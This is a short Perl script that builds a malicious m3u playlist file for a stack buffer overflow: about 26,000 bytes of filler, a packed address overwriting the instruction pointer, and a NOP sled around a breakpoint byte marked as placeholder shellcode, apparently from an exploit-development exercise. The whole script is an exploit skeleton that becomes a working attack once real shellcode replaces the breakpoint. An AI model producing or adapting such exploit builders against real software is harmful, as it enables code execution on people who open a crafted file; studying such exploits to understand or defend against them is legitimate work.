#! /usr/bin/perl

my $file= "crash.m3u";

my $junk= "\x41" x 25000;
my $junk2= "\x42" x 1072;
my $eip = pack('V',0x760dd337);

my $shellcode = "\x90" x 25; 

$shellcode = $shellcode."\xcc";  #this will cause the application to break, simulating shellcode, but allowing you to further debug
$shellcode = $shellcode."\x90" x 25;

open($FILE,">$file");
print $FILE $junk.$junk2.$eip.$shellcode;
close($FILE);
print "m3u File Created successfully\n";
